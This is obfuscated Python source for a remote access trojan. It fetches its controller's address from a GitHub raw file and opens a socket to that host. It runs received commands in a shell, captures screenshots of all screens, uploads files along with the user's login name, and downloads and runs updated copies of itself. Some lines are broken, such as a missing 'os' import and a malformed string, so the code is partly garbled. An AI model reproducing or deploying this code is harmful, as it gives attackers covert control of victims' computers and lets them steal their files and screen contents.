import sys,subprocess,socket,time,requests
from PIL import ImageGrab
ZtKtUXnRODPDQwbSnwreRQ = "04.12.24.3"
uWSMTApMgACpdkra = ""
oXQihsBXPzNUElEBx = ""
YQcKZwPbnqatHmZGkK = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
cwpPkHdCXWZeDOdByJM = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
ahHeEHDE = "!"
def yDCUxShrqDkFRstoSa(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def OkwfhBvRdGcPmVEX(s):
	meJTAzBtaywqXOpKK = s.recv(1024)
	if len(meJTAzBtaywqXOpKK)==0:
		return True
	PFJpTJGAWGr = meJTAzBtaywqXOpKK.decode("utf-8")
	if not PFJpTJGAWGr.startswith(ahHeEHDE):
		proc = subprocess.run(meJTAzBtaywqXOpKK.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	rwceoCFhuOlfF = PFJpTJGAWGr.split(" ")[0][1:]
	if rwceoCFhuOlfF == "download":
		PQnvHfQtlubOzCUTowlQFPB(s, PFJpTJGAWGr)
	elif rwceoCFhuOlfF == "screenshot":
		buWLiriH(s)
	elif rwceoCFhuOlfF == "vbJHoAdncdvhSuAepeHJmoY":
		s.send(bytes(ZtKtUXnRODPDQwbSnwreRQ, "utf-8"))
def PQnvHfQtlubOzCUTowlQFPB(s, PFJpTJGAWGr):
	uiynZxytli = PFJpTJGAWGr.replace(ahHeEHDE+"screenshot ", "").split(",")
	results = []
	for f in uiynZxytli:
		results += xssevor(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def buWLiriH(PFJpTJGAWGr):
	KAOjkYkBsKMurNdwUsSL = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	KAOjkYkBsKMurNdwUsSL.save(fpath)
	KAOjkYkBsKMurNdwUsSL.close()
	r = xssevor(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def xssevor(uYyVkqyFPybAvE, YvHHxmNDAQ, QmFsiDAemNDMhRZKfmjUOR=None):
	if not os.path.exists(uYyVkqyFPybAvE):
		return "FILE NOT FOUND: "+uYyVkqyFPybAvE
	headers = {"user":os.getlogin()}
	if QmFsiDAemNDMhRZKfmjUOR is not None:
		headers = {**headers, **QmFsiDAemNDMhRZKfmjUOR}
	requests.post(uWSMTApMgACpdkra+":"+oXQihsBXPzNUElEBx+"/"+YvHHxmNDAQ,
		files={open(uYyVkqyFPybAvE, "rb")},
		headers=headers)
	return "SUCCESS"
def avDMLOi():
	if uWSMTApMgACpdkra == "" or oXQihsBXPzNUElEBx == "":
		meJTAzBtaywqXOpKK = requests.get(YQcKZwPbnqatHmZGkK).text.replace("\n","").split(":")
		uWSMTApMgACpdkra = meJTAzBtaywqXOpKK[0].strip()
		oXQihsBXPzNUElEBx = meJTAzBtaywqXOpKK[1].strip()
		vbJHoAdncdvhSuAepeHJmoY = meJTAzBtaywqXOpKK[2].strip()
	return uWSMTApMgACpdkra, oXQihsBXPzNUElEBx, vbJHoAdncdvhSuAepeHJmoY
def IyXxvfVswDoPDvluqGCJI():
	ijzwPXAQL = os.path.basename(__file__)
	fileType = ijzwPXAQL.split(".")[-1]
	FLkatvMsHVH = ijzwPXAQL.replace(fileType,"") +"."+ZtKtUXnRODPDQwbSnwreRQ + fileType
	DEcwiVnKe = os.path.join(os.path.getcwd(), FLkatvMsHVH)
	with open(FLkatvMsHVH, "wb+") as f:
		f.write(requests.get(cwpPkHdCXWZeDOdByJM+"/file"+DEcwiVnKe.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+DEcwiVnKe)
	elif fileType == ".pyw":
		os.system("python "+DEcwiVnKe")
def BShIWEMXdFjUGYJhugnAijq():
	pass
def KBrXIEFI():
	h, p, v = avDMLOi()
	if ZtKtUXnRODPDQwbSnwreRQ != v:
		IyXxvfVswDoPDvluqGCJI()
	BShIWEMXdFjUGYJhugnAijq()
	while True:
		try:
			while True:
				MBYCsiGBJvDnluP=False
				try:
					s=yDCUxShrqDkFRstoSa(h, p)
					while not MBYCsiGBJvDnluP:
						s.send(b"\n>> ")
						MBYCsiGBJvDnluP=OkwfhBvRdGcPmVEX(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(KBrXIEFI())
